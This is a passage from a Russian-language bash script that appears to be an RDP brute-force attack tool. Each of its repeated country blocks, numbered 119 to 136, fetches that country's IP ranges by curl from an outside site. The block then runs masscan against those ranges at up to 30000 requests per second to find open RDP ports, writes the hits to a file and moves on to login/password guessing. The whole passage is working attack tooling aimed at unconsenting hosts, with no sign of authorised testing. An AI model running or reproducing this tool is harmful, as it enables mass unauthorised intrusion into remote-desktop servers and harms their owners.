echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "119" ]; then
curl http://ipdiapazon.16mb.com/Micronesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "120" ]; then
curl http://ipdiapazon.16mb.com/Moldova.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "121" ]; then
curl http://ipdiapazon.16mb.com/Monaco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "122" ]; then
curl http://ipdiapazon.16mb.com/Mongolia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "123" ]; then
curl http://ipdiapazon.16mb.com/Morocco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "124" ]; then
curl http://ipdiapazon.16mb.com/Mozambique.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "125" ]; then
curl http://ipdiapazon.16mb.com/Myanmar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "126" ]; then
curl http://ipdiapazon.16mb.com/Namibia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "127" ]; then
curl http://ipdiapazon.16mb.com/Nauru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "128" ]; then
curl http://ipdiapazon.16mb.com/Nepal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "129" ]; then
curl http://ipdiapazon.16mb.com/Netherlands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "130" ]; then
curl http://ipdiapazon.16mb.com/Netherlands_antilles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "131" ]; then
curl http://ipdiapazon.16mb.com/New_caledonia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "132" ]; then
curl http://ipdiapazon.16mb.com/New_zealand.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "133" ]; then
curl http://ipdiapazon.16mb.com/Nicaragua.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "134" ]; then
curl http://ipdiapazon.16mb.com/Niger.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "135" ]; then
curl http://ipdiapazon.16mb.com/Nigeria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "136" ]; then
curl http://ipdiapazon.16mb.com/Niue.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
